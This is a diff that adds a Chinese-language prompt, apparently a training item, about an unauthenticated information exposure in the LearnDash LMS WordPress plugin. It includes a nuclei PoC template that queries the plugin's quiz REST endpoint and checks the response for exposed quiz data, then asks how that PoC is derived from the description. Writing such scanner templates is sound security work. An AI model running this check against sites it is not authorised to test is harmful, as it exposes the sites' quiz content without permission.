@@ -1,0 +1,29 @@
+给你一个漏洞的描述：
+The LearnDash LMS plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 4.10.1 via API. This makes it possible for unauthenticated attackers to obtain access to quizzes.
+提供给你漏洞的nuclei格式的PoC代码如下：
+```yaml
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-json/ldlms/v1/sfwd-quiz"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id":'
+          - '"quiz_materials":'
+          - 'quizzes'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+```
+如何从漏洞描述生成一下PoC代码？输出你的思考过程
